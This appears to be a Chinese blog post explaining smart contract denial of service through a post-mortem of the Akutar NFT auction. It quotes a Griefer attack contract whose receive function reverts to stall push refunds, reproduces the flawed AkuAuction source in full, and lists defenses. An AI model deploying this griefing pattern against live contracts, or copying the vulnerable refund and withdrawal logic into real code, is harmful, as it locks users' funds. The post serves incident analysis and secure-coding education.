---
title: DDOS攻击
description: DDOS攻击
pubDate: 2026-07-18
category: 区块链
tags: ["区块链", "智能合约"]
heroImage: /images/covers/web3-cyber.jpg
---

### 智能合约拒绝服务（DoS）

Web2 里的 DDoS 是用海量请求打瘫服务器；**Web3 语境下的 DoS** 通常指：利用合约逻辑漏洞，让合约**关键功能永久或长期无法执行**（退款、提款、结算卡住），资金或业务被锁死。

### 两类致命问题

#### 1. Push 退款可被 DoS（`processRefunds`）

合约用循环 `call` 给每个 bidder 推送退款，且：

```solidity
(bool sent, ) = bidData.bidder.call{value: refund}("");
require(sent, "Failed to refund bidder");
```

若 bidder 是恶意合约，在 `receive` / `fallback` 里 `revert` 或耗尽 gas，**整笔 `processRefunds` 失败**，退款进度卡在攻击者处，后续用户也无法继续被 push 退款。

这是典型的 **push payment + 外部调用失败即整体 revert**。

#### 2. 提款条件写错导致资金永久锁定（真正锁死 1.1 万 ETH 的原因）

`claimProjectFunds` 要求：

```solidity
require(refundProgress >= totalBids, "Refunds not yet processed");
```

但：

- `refundProgress`：按**出价人数 / 记录条数**推进（与 `bidIndex` 同量级）
- `totalBids`：按**NFT 份数**累加（一人可拍多份）

因此 `refundProgress` 往往**永远到不了** `totalBids`，项目方无法提款。更合理的比较对象应是 `bidIndex`（出价记录数），而不是 `totalBids`。

> 历史上 DoS（griefing）曾被演示/缓解，但逻辑 bug 使资金最终永久锁死。

### 攻击合约思路（开源 post-mortem）

通过合约参拍，退款时 `receive` 故意失败，卡住 push 退款队列：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

interface IAkutarAuction {
    function bid(uint8 amount) external payable;
}

contract Griefer is Ownable {
    bool flag;

    // Set flag to false upon initialization
    constructor() {
        flag = false;
    }

    // Bid on the Akutar Auction through this contract
    function bidAuction(address auctionAddr, uint8 amount)
        external
        payable
        onlyOwner
    {
        IAkutarAuction auction = IAkutarAuction(auctionAddr);
        auction.bid{value: msg.value}(amount);
    }

    // Set flag to true to unblock the receive function
    function unblock() external onlyOwner {
        flag = true;
    }

    // Function to withdraw any funds after done griefing
    function withdraw() external onlyOwner {
        (bool sent, ) = address(msg.sender).call{value: address(this).balance}(
            ""
        );
        require(sent);
    }

    // Payment txs made to this contract revert if flag != true
    receive() external payable {
        require(flag);
    }
}
```

来源：[calvwang9/akutars-auction-post-mortem](https://github.com/calvwang9/akutars-auction-post-mortem)

### 如何防御

1. **Pull 优于 Push**：让用户自己 `claim` / `withdraw`，单人失败不影响其他人（参考 OZ `PaymentSplitter` / `VestingWallet`）
2. 外部 `call` 失败**不要**用 `require` 卡死整批业务；或限制 gas、跳过失败地址并记录
3. 限制仅 EOA 出价（`tx.origin == msg.sender`），或改收 **WETH** 避免任意合约回调
4. 循环不要依赖**攻击者可控、无界增长**的数组长度（防 OOG / 超 block gas limit）
5. `require` 条件与业务语义一致（Akutar 的 `refundProgress` vs `totalBids` 就是反例）
6. Owner 长期失联时，核心领取路径仍应可走通

### 其他常见合约 DoS

| 类型 | 表现 |
|------|------|
| 无界循环 | 数组被灌爆，遍历 gas 超过区块上限 |
| 退款/分账 Push | 任一收款方 revert 导致整批失败 |
| Return bomb | 恶意合约返回超大 returndata，拷贝耗尽 gas |
| 错误的权限/断言 | 关键函数永远无法通过 `require` |

### AkuAuction 主网完整合约

以下为 Sourcify / Etherscan 验证源码（`AkuAuction.sol`）：

```solidity
// File: @openzeppelin/contracts/utils/Strings.sol


// OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)

pragma solidity ^0.8.0;

/**
 * @dev String operations.
 */
library Strings {
    bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";

    /**
     * @dev Converts a `uint256` to its ASCII `string` decimal representation.
     */
    function toString(uint256 value) internal pure returns (string memory) {
        // Inspired by OraclizeAPI's implementation - MIT licence
        // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol

        if (value == 0) {
            return "0";
        }
        uint256 temp = value;
        uint256 digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        while (value != 0) {
            digits -= 1;
            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
            value /= 10;
        }
        return string(buffer);
    }

    /**
     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
     */
    function toHexString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "0x00";
        }
        uint256 temp = value;
        uint256 length = 0;
        while (temp != 0) {
            length++;
            temp >>= 8;
        }
        return toHexString(value, length);
    }

    /**
     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
     */
    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
        bytes memory buffer = new bytes(2 * length + 2);
        buffer[0] = "0";
        buffer[1] = "x";
        for (uint256 i = 2 * length + 1; i > 1; --i) {
            buffer[i] = _HEX_SYMBOLS[value & 0xf];
            value >>= 4;
        }
        require(value == 0, "Strings: hex length insufficient");
        return string(buffer);
    }
}

// File: @openzeppelin/contracts/utils/Context.sol


// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/Ownable.sol


// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)

pragma solidity ^0.8.0;


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: @openzeppelin/contracts/utils/Address.sol


// OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)

pragma solidity ^0.8.1;

/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     *
     * [IMPORTANT]
     * ====
     * You shouldn't rely on `isContract` to protect against flash loan attacks!
     *
     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
     * constructor.
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain `call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
     * revert reason using the provided one.
     *
     * _Available since v4.3._
     */
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

// File: workspaces/default_workspace/samuraisanta.sol

/**
 * SPDX-License-Identifier: MIT
 *
 * Copyright (c) 2022 WYE Company
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 *
 */

pragma solidity 0.8.13;





interface akuNFT {
    function airdropProgress() external view returns(uint256);
}

contract AkuAuction is Ownable {
    using Strings for uint256;

    address payable immutable project;

    uint256 public maxNFTs = 15000;
    uint256 public totalForAuction = 5495; //529 + 2527 + 6449

    struct bids {
        address bidder;
        uint80 price;
        uint8 bidsPlaced;
        uint8 finalProcess; //0: Not processed, 1: refunded, 2: withdrawn
    }

    uint256 private constant DURATION = 126 minutes;
    uint256 public immutable startingPrice;
    uint256 public immutable startAt;
    uint256 public expiresAt;
    uint256 public immutable discountRate;
    mapping(address=>uint256) public mintPassOwner;
    uint256 public constant mintPassDiscount = 0.5 ether;
    mapping(address => uint256) public personalBids;
    mapping(uint256 => bids) public allBids;
    uint256 public bidIndex = 1;
    uint256 public totalBids;
    uint256 public totalBidValue;
    uint256 public maxBids = 3;
    uint256 public refundProgress = 1;

    akuNFT public akuNFTs;

    constructor(address _project, 
        uint256 startingTime,
        uint256 _startingPrice,
        uint256 _discountRate)
    {
        project = payable(_project);

        startingPrice = _startingPrice;
        startAt = startingTime;
        expiresAt = startAt + DURATION;
        discountRate = _discountRate;

        require(_startingPrice >= _discountRate * (DURATION/6 minutes), "Starting price less than minimum");
    }

    function getPrice() public view returns (uint80) {
        uint256 currentTime = block.timestamp;
        if(currentTime > expiresAt) currentTime = expiresAt;
        uint256 timeElapsed = (currentTime - startAt) / 6 minutes;
        uint256 discount = discountRate * timeElapsed;
        return uint80(startingPrice - discount);
    }

    function bid(uint8 amount) external payable {
        _bid(amount, msg.value);
    }

    receive() external payable {
        revert("Please use the bid function");
    }

    function _bid(uint8 amount, uint256 value) internal {
        require(block.timestamp > startAt, "Auction not started yet");
        require(block.timestamp < expiresAt, "Auction expired");
        uint80 price = getPrice();
        uint256 totalPrice = price * amount;
        if (value < totalPrice) {
            revert("Bid not high enough");
        }
        
        uint256 myBidIndex = personalBids[msg.sender];
        bids memory myBids;
        uint256 refund;

        if (myBidIndex > 0) {
            myBids = allBids[myBidIndex];
            refund = myBids.bidsPlaced * (myBids.price - price);
        }
        uint256 _totalBids = totalBids + amount;
        myBids.bidsPlaced += amount;

        if (myBids.bidsPlaced > maxBids) {
            revert("Bidding limits exceeded");
        }

        if(_totalBids > totalForAuction) {
            revert("Auction Full");
        } else if (_totalBids == totalForAuction) {
            expiresAt = block.timestamp; //Auction filled
        }

        myBids.price = price;

        if (myBidIndex > 0) {
            allBids[myBidIndex] = myBids;
        } else {
            myBids.bidder = msg.sender;
            personalBids[msg.sender] = bidIndex;
            allBids[bidIndex] = myBids;
            bidIndex++;
        }
        
        totalBids = _totalBids;
        totalBidValue += totalPrice;

        refund += value - totalPrice;
        if (refund > 0) {
            (bool sent, ) = msg.sender.call{value: refund}("");
            require(sent, "Failed to refund bidder");
        }
    }

    function loadMintPassOwners(address[] calldata owners, uint256[] calldata amounts) external onlyOwner {
        for (uint256 i = 0; i < owners.length; i++) {
            mintPassOwner[owners[i]] = amounts[i];
        }
    }

    function myBidCount(address user) public view returns(uint256) {
        return allBids[personalBids[user]].bidsPlaced;
    }
    function myBidData(address user) external view returns(bids memory) {
        return allBids[personalBids[user]];
    }

    function setNFTContract(address _contract) external onlyOwner {
        akuNFTs = akuNFT(_contract);
    }

    function emergencyWithdraw() external {
        require(block.timestamp > expiresAt + 3 days, "Please wait for airdrop period.");
        
        bids memory bidData = allBids[personalBids[msg.sender]];
        require(bidData.bidsPlaced > 0, "No bids placed");
        require(bidData.finalProcess == 0, "Refund already processed");

        allBids[personalBids[msg.sender]].finalProcess = 2;
        (bool sent, ) = bidData.bidder.call{value: bidData.price * bidData.bidsPlaced}("");
        require(sent, "Failed to refund bidder");
    }

    function processRefunds() external {
      require(block.timestamp > expiresAt, "Auction still in progress");
      uint256 _refundProgress = refundProgress;
      uint256 _bidIndex = bidIndex;
      require(_refundProgress < _bidIndex, "Refunds already processed");
      
      uint256 gasUsed;
      uint256 gasLeft = gasleft();
      uint256 price = getPrice();
      
      for (uint256 i=_refundProgress; gasUsed < 5000000 && i < _bidIndex; i++) {
          bids memory bidData = allBids[i];
          if (bidData.finalProcess == 0) {
            uint256 refund = (bidData.price - price) * bidData.bidsPlaced;
            uint256 passes = mintPassOwner[bidData.bidder];
            if (passes > 0) {
                refund += mintPassDiscount * (bidData.bidsPlaced < passes ? bidData.bidsPlaced : passes);
            }
            allBids[i].finalProcess = 1;
            if (refund > 0) {
                (bool sent, ) = bidData.bidder.call{value: refund}("");
                require(sent, "Failed to refund bidder");
            }
          }
          
          gasUsed += gasLeft - gasleft();
          gasLeft = gasleft();
          _refundProgress++;
      }

      refundProgress = _refundProgress;
    }

    function claimProjectFunds() external onlyOwner {
        require(block.timestamp > expiresAt, "Auction still in progress");
        require(refundProgress >= totalBids, "Refunds not yet processed");
        require(akuNFTs.airdropProgress() >= totalBids, "Airdrop not complete");

        (bool sent, ) = project.call{value: address(this).balance}("");
        require(sent, "Failed to withdraw");        
    }

    function getAuctionDetails(address user) external view returns(uint256 remainingNFTs, uint256 expires, uint256 currentPrice, uint256 userBids) {
        remainingNFTs =  totalForAuction - totalBids;
        expires = expiresAt;
        currentPrice = getPrice();
        if(user != address(0))
            userBids = allBids[personalBids[user]].bidsPlaced;
    }
}
```

### 小结

- Web3 DoS ≠ 传统流量型 DDoS，核心是**逻辑让服务停摆**
- Akutar：`processRefunds` 的 push+require 可被 grief；`claimProjectFunds` 条件错误导致 **ETH 永久锁定**
- 生产实践：退款/分账尽量 **pull**；外部调用失败隔离；条件变量语义写对并审计
